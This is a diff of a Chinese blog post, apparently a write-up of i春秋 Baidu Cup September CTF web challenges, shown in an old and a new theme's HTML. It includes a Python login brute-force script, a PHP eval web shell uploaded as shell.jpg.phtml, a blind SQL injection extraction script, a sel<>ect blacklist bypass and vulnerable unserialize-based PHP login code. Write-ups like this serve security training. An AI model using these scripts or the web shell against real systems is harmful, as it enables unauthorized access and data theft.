@@ -1,336 +1,560 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="123python脚本跑登录账户密码 12345678910111213141516171819202122# encoding: utf-8import requestsimport sysreload(sys)sys.setdefaultencoding(&#39;utf8&#39;)with open(&#39;user.php.bak&#39;) as f:    for line in f.readlines():">
-<meta property="og:type" content="article">
-<meta property="og:title" content="百度杯九月web题解">
-<meta property="og:url" content="http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/index.html">
-<meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="123python脚本跑登录账户密码 12345678910111213141516171819202122# encoding: utf-8import requestsimport sysreload(sys)sys.setdefaultencoding(&#39;utf8&#39;)with open(&#39;user.php.bak&#39;) as f:    for line in f.readlines():">
-<meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2019-09-27T01:58:32.000Z">
-<meta property="article:modified_time" content="2020-05-15T08:25:30.000Z">
-<meta property="article:author" content="osword">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>百度杯九月web题解</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>百度杯九月web题解 - osword&#39;s blog</title>
 
-    <!-- persian styles -->
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
     
       
-<link rel="stylesheet" href="/css/rtl.css">
-
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.1"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E6%9C%88web%E9%A2%98%E8%A7%A3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/09/25/vBulletin5-x%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&text=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&title=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&is_video=false&description=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=百度杯九月web题解&body=Check out this article: http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&title=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&title=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&title=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&title=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&name=百度杯九月web题解&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&t=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#123"><span class="toc-number">1.</span> <span class="toc-text">123</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLI"><span class="toc-number">2.</span> <span class="toc-text">SQLI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL"><span class="toc-number">3.</span> <span class="toc-text">SQL</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        百度杯九月web题解
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">osword's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-09-27T01:58:32.000Z" itemprop="datePublished">2019-09-27</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-    </div>
-
-
-      <span id="/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/" class="leancloud_visitors" data-flag-title="百度杯九月web题解">
-    <em class="post-meta-item-text">阅读量 </em>
-    <i class="leancloud-visitors-count" data-index="/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/"></span>
-    </div>
-
-  </header>
   
 
-  <div class="content" itemprop="articleBody">
-    <h1 id="123"><a href="#123" class="headerlink" title="123"></a>123</h1><p>python脚本跑登录账户密码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'user.php.bak'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        s=line.strip()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1990</span>,<span class="number">2000</span>):</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">"username"</span>:s,</span><br><span class="line">                <span class="string">"password"</span>:s+str(i),</span><br><span class="line">                <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">            &#125;</span><br><span class="line">            url = <span class="string">"http://86adc2d12122466badd619509fbcf3731899ba5ef4e34703.changame.ichunqiu.com/login.php"</span></span><br><span class="line">            rep=requests.post(url=url,data=data)</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"登录失败"</span> <span class="keyword">not</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">                print(rep.text)</span><br><span class="line">                print(<span class="string">"username = "</span>+s)</span><br><span class="line">                print(<span class="string">"password = "</span> +s+str(i))</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-09-27 09:58" pubdate>
+        2019年9月27日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      352 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      6
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">百度杯九月web题解</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="123"><a href="#123" class="headerlink" title="123"></a>123</h1><p>python脚本跑登录账户密码</p>
+<pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> sys
+reload(sys)
+sys.setdefaultencoding(<span class="hljs-string">'utf8'</span>)
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'user.php.bak'</span>) <span class="hljs-keyword">as</span> f:
+    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():
+        s=line.strip()
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1990</span>,<span class="hljs-number">2000</span>):
+            data=&#123;
+                <span class="hljs-string">"username"</span>:s,
+                <span class="hljs-string">"password"</span>:s+str(i),
+                <span class="hljs-string">"submit"</span>:<span class="hljs-string">"submit"</span>
+            &#125;
+            url = <span class="hljs-string">"http://86adc2d12122466badd619509fbcf3731899ba5ef4e34703.changame.ichunqiu.com/login.php"</span>
+            rep=requests.post(url=url,data=data)
+            print(data)
+            <span class="hljs-keyword">if</span> <span class="hljs-string">"登录失败"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> rep.text:
+                print(rep.text)
+                print(<span class="hljs-string">"username = "</span>+s)
+                print(<span class="hljs-string">"password = "</span> +s+str(i))
+                <span class="hljs-keyword">break</span></code></pre>
 
 <p><code>username = zhangyuzhen</code><br><code>password = zhangyuzhen1995</code></p>
 <p>上传文件，提示需要有jpg后缀，猜测为白名单，直接构造shell.jpg.phtml</p>
 <p>文件内容:<code>&lt;?=eval($_GET[_]);?&gt;</code></p>
 <p>访问/view.php?file=flaflagg得到flag得到flag</p>
 <h1 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h1><p>过滤逗号,脚本如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://f75cd2c0820c4f3a88ff220eaa86d3901024ed0736f34044.changame.ichunqiu.com/l0gin.php"</span></span><br><span class="line"></span><br><span class="line">str1=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        id=<span class="string">f"1' and ascii(substring((select concat(table_name) from information.schema_tables where table_schema=database()) from <span class="subst">&#123;i&#125;</span> for 1))=<span class="subst">&#123;j&#125;</span> and '1"</span></span><br><span class="line">        param=&#123;<span class="string">'id'</span>:id&#125;</span><br><span class="line">        rep=requests.get(url=url,params=param)</span><br><span class="line">        <span class="comment">#print(rep.url)</span></span><br><span class="line">        <span class="comment">#print(param)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">            str1+=chr(j)</span><br><span class="line">            print(str1)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url=<span class="hljs-string">"http://f75cd2c0820c4f3a88ff220eaa86d3901024ed0736f34044.changame.ichunqiu.com/l0gin.php"</span>
+
+str1=<span class="hljs-string">''</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):
+        id=<span class="hljs-string">f"1' and ascii(substring((select concat(table_name) from information.schema_tables where table_schema=database()) from <span class="hljs-subst">&#123;i&#125;</span> for 1))=<span class="hljs-subst">&#123;j&#125;</span> and '1"</span>
+        param=&#123;<span class="hljs-string">'id'</span>:id&#125;
+        rep=requests.get(url=url,params=param)
+        <span class="hljs-comment">#print(rep.url)</span>
+        <span class="hljs-comment">#print(param)</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-string">'flag'</span> <span class="hljs-keyword">in</span> rep.text:
+            str1+=chr(j)
+            print(str1)
+            <span class="hljs-keyword">break</span></code></pre>
 
 <h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>注入发现&lt;&gt;被替换为空，且先执行过滤在执行黑名单判断。<code>sel&lt;&gt;ect</code>绕过黑名单</p>
 <p>LOGIN</p>
 <p>array_merge合并函数，遇到null会返回NULL，这里$_SESSION为null.</p>
 <p>所以传如cookie值去覆盖</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line">	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line">		$db = <span class="keyword">new</span> db();</span><br><span class="line">		$row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span><br><span class="line">		<span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´ "</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		header(<span class="string">'Location: index.php?error=1'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+	<span class="hljs-keyword">include</span> <span class="hljs-string">'common.php'</span>;
+	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
+	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($requset[<span class="hljs-string">'token'</span>]))
+	&#123;
+		$login = unserialize(gzuncompress(base64_decode($requset[<span class="hljs-string">'token'</span>])));
+		$db = <span class="hljs-keyword">new</span> db();
+		$row = $db-&gt;select(<span class="hljs-string">'user=\''</span>.mysql_real_escape_string($login[<span class="hljs-string">'user'</span>]).<span class="hljs-string">'\''</span>);
+		<span class="hljs-keyword">if</span>($login[<span class="hljs-string">'user'</span>] === <span class="hljs-string">'ichunqiu'</span>)
+		&#123;
+			<span class="hljs-keyword">echo</span> $flag;
+		&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($row[<span class="hljs-string">'pass'</span>] !== $login[<span class="hljs-string">'pass'</span>])&#123;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">'unserialize injection!!'</span>;
+		&#125;<span class="hljs-keyword">else</span>&#123;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´ "</span>;
+		&#125;
+	&#125;<span class="hljs-keyword">else</span>&#123;
+		header(<span class="hljs-string">'Location: index.php?error=1'</span>);
+	&#125;
+
+<span class="hljs-meta">?&gt;</span></code></pre>
 
 
 
-  </div>
-</article>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E6%9C%88web%E9%A2%98%E8%A7%A3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">百度杯十月web题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/09/25/vBulletin5-x%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/">
+                        <span class="hidden-mobile">vBulletin5-x前台代码执行漏洞(复现)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    <section id="comments" class="comments">
-      <style>
-        .comments{margin:30px;padding:10px;background:#fff}
-        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-      </style>
-      <div class="valine_comment"></div>
-<!--载入js，在</body>之前插入即可-->
-<!--Leancloud 操作库:-->
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<!--Valine 的核心代码库-->
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-  new Valine({
-      el: '.valine_comment',
-      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
-      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
-      placeholder: '这里留言。。',
-      notify: 'true',
-      verify: 'true',
-      visitor: true
-    });
-</script>
-
-    </section>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
+            
+          </article>
+        </div>
+      </div>
     </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#123"><span class="toc-number">1.</span> <span class="toc-text">123</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLI"><span class="toc-number">2.</span> <span class="toc-text">SQLI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL"><span class="toc-number">3.</span> <span class="toc-text">SQL</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&text=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/&title=百度杯九月web题解" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
